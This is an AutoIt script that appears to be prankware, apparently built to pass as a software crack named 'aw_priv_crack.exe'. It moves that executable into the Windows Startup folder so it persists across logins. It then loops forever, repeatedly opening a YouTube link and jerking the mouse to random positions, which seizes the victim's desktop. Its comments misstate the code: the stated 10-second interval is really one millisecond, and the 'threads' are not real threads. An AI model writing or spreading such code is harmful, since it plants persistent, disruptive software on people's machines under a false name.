Global $lastShellExecuteTime = 0

Func MoveToStartup()
    ; Get the script directory
    Local $scriptDir = @ScriptDir

    ; Specify the source and destination paths
    Local $sourcePath = $scriptDir & "\aw_priv_crack.exe"
    Local $destinationPath = @StartupDir & "\aw_priv_crack.exe"

    ; Check if the source file exists
    If FileExists($sourcePath) Then
        ; Move the file to the destination
        FileMove($sourcePath, $destinationPath, 1)
    EndIf
EndFunc

Func OpenYouTubeLink()
    ShellExecute('https://youtu.be/kK7uljnAmQI')
EndFunc

Func ThreadOpenYouTubeLink()
    While 1
        ; Execute OpenYouTubeLink function every 10 seconds
        If TimerDiff($lastShellExecuteTime) >= 1 Then
            OpenYouTubeLink()
            $lastShellExecuteTime = TimerInit()
        EndIf

        $x = Random(0, @DesktopWidth, 1)
        $y = Random(0, @DesktopHeight, 1)
        MouseMove($x, $y, 0)
        Sleep(100)
    WEnd
EndFunc

MoveToStartup()

; Create multiple threads to open the YouTube link simultaneously
For $i = 1 To 5 ; Modify the number of threads as desired
    Execute("ThreadOpenYouTubeLink()")
Next

While True
    Sleep(20)
WEnd
